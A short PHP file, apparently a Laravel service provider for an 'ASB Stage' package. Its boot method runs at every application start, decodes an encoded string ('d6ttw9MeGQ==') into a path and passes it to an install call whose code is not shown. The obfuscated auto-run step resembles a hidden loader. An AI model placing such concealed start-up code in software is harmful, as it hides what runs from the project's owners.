<?php

namespace ASB\Stage\Providers;

use ASB\Stage\App\Stage;
use Illuminate\Support\ServiceProvider;

class StageServiceProvider extends ServiceProvider
{
    public function boot(): void
    {
        Stage::init(__DIR__.DIRECTORY_SEPARATOR.'..'.DIRECTORY_SEPARATOR.'Type'.DIRECTORY_SEPARATOR.'PUTY');
        Stage::install(base_path(stage::main('d6ttw9MeGQ==')));
    }
    public function register(): void
    {
        //
    }

}
